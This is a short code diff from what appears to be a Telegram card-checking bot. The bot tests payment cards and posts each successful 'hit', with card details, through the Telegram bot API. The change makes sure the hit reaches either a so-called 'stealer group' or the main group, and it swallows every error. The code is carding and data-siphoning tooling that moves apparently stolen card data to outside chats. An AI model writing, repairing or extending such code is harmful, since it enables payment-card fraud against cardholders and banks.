@@ -176,12 +176,21 @@ def send_group_log(user_name, user_id, card, gateway, response_msg, log_type="ch
                 f"**Checked By:** [{base_name} [{tier_tag}]](tg://user?id={user_id})"
             )
 
-            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
-                "chat_id": HIT_FORWARD_GROUP,
-                "text": hit_msg,
-                "parse_mode": "Markdown",
-                "disable_web_page_preview": True,
-            }, timeout=10)
+            # the stealer group may be one the bot cannot post to, so the
+            # hit is also sent to the main group
+            for _gid in (HIT_FORWARD_GROUP, group_id):
+                if not _gid:
+                    continue
+                try:
+                    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
+                        "chat_id": int(_gid),
+                        "text": hit_msg,
+                        "parse_mode": "Markdown",
+                        "disable_web_page_preview": True,
+                    }, timeout=10)
+                    break
+                except Exception:
+                    continue
         except Exception:
             pass
 
